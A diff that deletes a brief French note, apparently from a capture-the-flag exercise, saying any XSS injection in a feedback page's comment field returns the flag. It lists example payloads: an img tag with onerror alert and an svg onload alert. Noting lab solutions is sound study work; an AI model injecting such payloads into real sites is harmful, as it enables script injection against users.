@@ -1,6 +1,0 @@
-sur la page de feedback n'importe quel injection (ou pas) xss renvoie le flag quelque exemple a mettre dans le champ commentaire
-
-1. <img src=x onerror=alert('XSS réussie')>a
-2. <svg/onload=alert('XSS')>a
-3. script 
-(WTF?)
